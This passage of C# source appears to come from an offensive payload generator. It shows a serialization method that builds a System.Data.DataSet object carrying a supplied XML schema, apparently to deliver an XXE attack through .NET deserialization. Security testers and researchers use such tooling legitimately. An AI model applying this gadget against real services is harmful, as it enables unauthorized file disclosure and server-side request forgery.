            _xmlSchema = xmlSchema;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType(DataSetXxeGenerator.DataSetTypeName, true));
            info.AddValue(DataSetXxeGenerator.SchemaMemberName, _xmlSchema);
            info.AddValue(DataSetXxeGenerator.DiffGramMemberName, null, typeof(string));
        }
    }
}
